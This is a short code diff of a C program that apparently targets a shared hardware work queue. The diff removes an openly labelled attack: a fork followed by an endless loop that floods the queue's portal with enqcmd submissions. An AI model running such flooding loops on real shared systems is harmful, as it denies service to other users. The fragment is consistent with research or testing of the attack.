@@ -20,13 +20,6 @@ int main(int argc, char *argv[]) {
     desc.dst_addr = (uintptr_t)dst;
     desc.completion_addr = (uintptr_t)&comp;
 
-    fork();
-    printf("[attack] start...\n");
-
-    for (;;) {
-        enqcmd(wq_info.wq_portal, &desc);
-        // write(wq_info.wq_fd, &desc, sizeof(desc));
-    }
 
     return 0;
 }
